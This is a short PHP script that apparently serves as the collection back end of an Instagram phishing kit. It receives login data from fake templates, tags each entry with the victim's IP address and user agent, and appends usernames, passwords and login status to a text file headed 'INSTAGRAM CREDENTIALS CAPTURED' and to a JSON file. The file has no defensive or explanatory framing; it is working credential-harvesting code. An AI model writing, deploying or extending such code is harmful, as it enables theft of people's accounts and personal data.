<?php

// Instagram credentials handler - receives data from templates and stores in root location

if($_SERVER['REQUEST_METHOD'] == "POST"){
    $data = $_POST['data'];
    
    // Decode JSON data
    $decodedData = json_decode($data, true);
    
    // Add server information
    $decodedData['server_timestamp'] = date('Y-m-d H:i:s');
    $decodedData['ip_address'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $decodedData['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $decodedData['request_uri'] = $_SERVER['REQUEST_URI'] ?? 'unknown';
    
    // Format the data for storage
    $formattedData = "=== INSTAGRAM CREDENTIALS CAPTURED ===\n";
    $formattedData .= "Timestamp: " . $decodedData['server_timestamp'] . "\n";
    $formattedData .= "IP Address: " . $decodedData['ip_address'] . "\n";
    $formattedData .= "User Agent: " . $decodedData['user_agent'] . "\n";
    $formattedData .= "Request URI: " . $decodedData['request_uri'] . "\n";
    
    if(isset($decodedData['type']) && $decodedData['type'] == 'instagram_login') {
        $formattedData .= "Username: " . $decodedData['username'] . "\n";
        $formattedData .= "Password: " . $decodedData['password'] . "\n";
        $formattedData .= "Login Status: " . $decodedData['data']['loginStatus'] . "\n";
        $formattedData .= "Full Data: " . json_encode($decodedData, JSON_PRETTY_PRINT) . "\n";
    } else {
        $formattedData .= "General Data: " . json_encode($decodedData, JSON_PRETTY_PRINT) . "\n";
    }
    
    $formattedData .= "==========================================\n\n";
    
    // Store in root location
    file_put_contents("instagram_credentials.txt", $formattedData, FILE_APPEND | LOCK_EX);
    
    // Also store in a JSON format for easier parsing
    $jsonData = json_encode($decodedData, JSON_PRETTY_PRINT) . "\n";
    file_put_contents("instagram_data.json", $jsonData, FILE_APPEND | LOCK_EX);
    
    // Return success response
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Instagram credentials saved successfully']);
} else {
    // Return error for non-POST requests
    header('Content-Type: application/json');
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}

?>
